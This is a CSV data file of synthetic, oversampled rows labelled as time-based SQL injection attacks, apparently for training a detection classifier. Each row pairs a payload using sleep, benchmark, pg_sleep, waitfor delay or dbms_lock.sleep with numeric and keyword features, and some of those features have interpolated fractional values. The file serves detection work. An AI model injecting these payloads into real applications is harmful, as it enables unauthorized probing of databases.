id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000095,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000074,0.4398386918814409,71.86679609888743,18.0,2.992860986692897,24.62851595761967,2.0,34.99062411301421,10.247656028253553,0.34343711276973826,0.027855978295815292,0.48625194017006795,0.14245496876437846,0.0,3.999999999999999,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.247656028253554,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.12382801412677696,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1238280141267767
SMOTE_000096,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000123,0.10450360524643042,72.62003665123603,26.0,3.6536034679000853,16.0,21.0,27.696029320988828,7.924007330247207,0.22040278275185804,0.2892786523618137,0.3812347127714697,0.10908385211485855,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.924007330247207,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.6675925509755408,82.22941631981192,20.747059474258844,2.9747318683727153,28.252940525741153,1.7470594742588457,41.48235684555307,10.747059474258846,0.34428313964247426,0.021072072232238587,0.5039661523306347,0.13067863579465244,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.747059474258844,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.7470594742588451,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.747059474258845
SMOTE_000098,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000005,0.823395981380116,78.55852842577593,26.558528425775926,3.3741021673035134,20.0,10.0,37.0,11.558528425775926,0.25459744100689413,0.12729872050344707,0.4710052658627541,0.14709857262690473,0.0,1.0,2.0,0.0,0.0,1.0,0.0,6.0,0.5585284257759249,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000099,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000242,1.3352608664145946,65.66831089880753,22.556103632935844,3.382431757074783,20.112207265871685,10.0,28.0,7.556103632935843,0.30608287265355527,0.15235934958300482,0.42660617883241353,0.11495159893102641,0.5561036329358431,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.5561036329358431,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.443896367064157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.443896367064157
SMOTE_000100,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000068,1.6542603188654985,67.28107745463677,19.239640848454407,3.2013736011556846,26.85946127268161,1.3801795757727948,29.661257030409573,9.380179575772797,0.40086561516673347,0.020244982658850483,0.43952169354310494,0.13936770863131112,0.0,3.3801795757727957,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,5.380179575772797,0.0,0.6198204242272037,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.6198204242272036,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.38017957577279626,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000101,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000163,1.2963403939061853,64.4850698910189,23.970139782037773,3.4334178635201713,18.485069891018888,10.0,28.0,8.0,0.2866137536026127,0.15508396660812768,0.4342351065027575,0.12406717328650214,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4850698910188873,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000168,0.4973418351916043,69.26474105241152,19.26474105241152,2.7854874513837795,10.0,10.0,38.0,11.26474105241152,0.14437941811094923,0.14437941811094923,0.5486417888216071,0.16259937495649443,1.0,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.26474105241151935,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000002,1.9771604259833684,67.98789938003962,27.287442945708626,4.268462459779954,34.12557054291375,6.299543565669003,15.42511410858275,12.137671162874124,0.49982713400056605,0.09546858323734053,0.22674639399550078,0.17795788876659263,3.7125570542913744,0.0,2.0,0.0,0.0,0.2874429457086253,0.0,1.7125570542913748,0.0,0.7125570542913746,0.7125570542913746,3.2874429457086256,1.0,0.0,1.0,0.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,0.0,0.2874429457086254,0.0,0.2874429457086254,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5748858914172508
SMOTE_000104,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.14933251804584852,76.51356223324383,19.7081373399463,3.0393743867666494,28.610849786595068,1.0,36.90271244664876,10.0,0.37376301024598646,0.013074754286932944,0.48241469259775127,0.1307475428693293,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000105,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000226,1.133771755227082,69.76831066713804,25.88415533356902,3.564872573442678,19.628051777856342,10.0,29.51220711142536,10.62805177785634,0.28153483052670364,0.14358520482504622,0.42257181846408814,0.15230814618416205,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.62805177785634,1.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.6280517778563406,0.3719482221436594,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000106,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000304,1.272462852331835,72.48931713699764,26.0,3.619958546351293,15.0,21.489317136997634,28.0,8.0,0.20693688031678759,0.29641460692292226,0.3862821765913368,0.11036633616895336,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.48931713699763485,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,0.6449591637765058,65.0,22.598616713995384,3.375347743091762,19.0,10.0,28.0,8.0,0.2923076923076923,0.15384615384615385,0.4307692307692308,0.12307692307692308,0.19953890466512747,0.8004610953348725,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.19953890466512747,0.8004610953348725,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.5819350292815245,66.66234598301958,23.441563988679718,3.3962262133141743,20.883127977359432,10.0,28.77921800566014,7.0,0.312920405543551,0.150060724674968,0.43197636250900345,0.1050425072724776,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.779218005660142,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.2207819943398584,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.522419443578067,78.2217496087876,21.53091671013471,3.4183538266644544,24.123666840538846,10.0,32.690832898652886,11.407249869595866,0.310873633404656,0.1282615603894699,0.41564842811042996,0.1452163780954442,0.0,3.999999999999999,0.0,0.0,0.0,1.4690832898652886,0.0,4.938166579730577,0.0,0.0,1.0,1.4690832898652886,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000091,0.7309156109264485,63.86767532618713,25.85538744563548,3.7687533197676246,24.0,9.144612554364523,23.72306277182261,7.0,0.3761619029610096,0.14315654773160355,0.370967660943759,0.1097138883636278,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.14461255436452214,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.14461255436452208,0.0,-2.7755575615628914e-17,0.14461255436452214,0.14461255436452214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8553874456354779,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2892251087290443
SMOTE_000111,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000285,0.08572127535691076,63.119973261772486,19.0239946523545,3.1720332566921243,25.90402139058201,1.0239946523544976,28.14396791412699,8.047989304708997,0.4105588335202105,0.01619787344457535,0.44577748068636097,0.12746581234885312,0.0,3.0239946523544985,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,5.023994652354498,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.976005347645502,0.0,-2.7755575615628914e-17,0.0,1.0,0.023994652354498103,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.45186981652075026,72.17354712341323,22.0,3.4033746527070834,15.17354712341323,18.0,30.0,9.0,0.2102154083018558,0.24940566053625607,0.4156761008937601,0.12470283026812803,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.17354712341323048,0.8264528765867696,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,2.3914234113812523,78.21603324756882,26.054008311892204,3.6865790328197185,17.527004155946102,20.054008311892204,29.054008311892204,11.581012467838306,0.22434504652790732,0.25640935784051017,0.3717777989696929,0.14746779666188967,0.0,2.581012467838306,0.0,0.0,0.0,1.527004155946102,0.0,4.472995844053898,1.5270041559461023,0.0,1.0,1.527004155946102,0.0,1.0,0.0,0.4729958440538979,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.5270041559461023,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.527004155946102
SMOTE_000114,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",nearest_attack_euclidean,R000120,0.8011047367175157,66.0,26.182083666624074,3.800476596056102,20.7283346664963,15.0,22.45374900012778,7.817916333375925,0.31406567676509545,0.22727272727272727,0.3402083181837542,0.11845327777842311,0.8179163333759252,0.0,0.3641673332481494,0.0,0.0,-1.1102230246251565e-16,0.0,4.817916333375925,0.0,0.0,1.0,1.1820836666240746,0.8179163333759254,0.0,0.1820836666240747,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000085,0.6514101723421554,80.07867790782925,18.73033052304269,2.935174453743139,27.0,2.0,40.078677907829245,11.0,0.33733044021482544,0.02498744001591298,0.5002511996817401,0.13743092008752147,0.7303305230426886,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.269669476957311,0.0,0.0,0.0,1.0,0.7303305230426886,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000116,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R000302,1.8512652185461094,80.0,23.58731027806101,3.4208403980262605,27.0,4.0,35.0,14.0,0.3375,0.05,0.4375,0.175,3.650758887755962,2.349241112244038,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.0,0.0,0.0,0.0,0.0,1.0,0.5873102780610098,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000289,0.03154794957778435,65.98826576108642,28.953063044345676,4.0953198271337445,23.0,12.0,21.0,9.988265761086419,0.34854775932284676,0.18185100486409395,0.3182392585121644,0.15136197730089498,2.0,0.9882657610864188,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.9882657610864188,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000021,1.6401552805084068,75.92588348966355,16.15553009379813,2.6458348920767607,12.15553009379813,13.081413583461678,41.68893981240374,9.0,0.15965181466896383,0.17084600928490057,0.550845479400048,0.11865669664608759,0.0,0.0,0.0,0.0,0.0,1.3851766979327098,0.0,7.22964660413458,0.0,0.0,0.38517669793271,1.3851766979327098,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000119,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000219,1.0789606509524399,63.41014571095655,21.410145710956545,3.275524220407997,18.410145710956545,10.0,28.0,7.0,0.2902918048097829,0.15771293226449268,0.44159621034057955,0.11039905258514487,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.41014571095654606,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,0.2533524322297579,83.84588027628898,25.64488623885815,3.49779925143539,20.467329358287223,18.0,35.46732935828722,9.911221559714537,0.24362083491051395,0.21515917565797357,0.42292014795882527,0.11829984147268723,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.911221559714537,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000121,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000012,1.1283233030393685,72.5922613022904,23.776783906871174,3.4756722976090493,15.592261302290392,18.0,30.0,9.0,0.2147562584152497,0.24797170786886852,0.41328617978144755,0.12398585393443426,1.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5922613022903918,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000122,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000141,0.016054069521335774,68.02445971900578,25.993885070248556,3.7437921433062455,15.0,22.0,24.024459719005776,7.0,0.2205132974295166,0.32341950289662436,0.3531609942067513,0.10290620546710774,0.0,0.9938850702485558,0.0,0.0,0.0,1.0,0.0,4.006114929751444,0.0,0.0,1.0,1.0,0.0,0.9938850702485558,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000051,1.4140693912958204,67.16361931692879,16.242978306012947,2.543097617423992,10.378510846993526,10.0,39.02808677594821,7.757021693987053,0.15491419781023258,0.14979918636437412,0.5801971624786145,0.11508945334677881,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.757021693987053,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.3785108469935263,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000273,0.7644818993648038,65.0,24.290448654412348,3.447918900001114,19.0,10.0,28.0,8.0,0.2923076923076923,0.15384615384615385,0.4307692307692308,0.12307692307692308,0.7634828848041157,0.23651711519588414,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.763482884804116,0.23651711519588403,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000264,0.030995061916474286,78.01182918961848,20.01182918961848,2.989315368791305,27.01182918961848,2.0,39.0,10.0,0.3462517508391013,0.025637186241603868,0.49992513171127545,0.12818593120801933,0.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.011829189618481117,0.9881708103815188,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
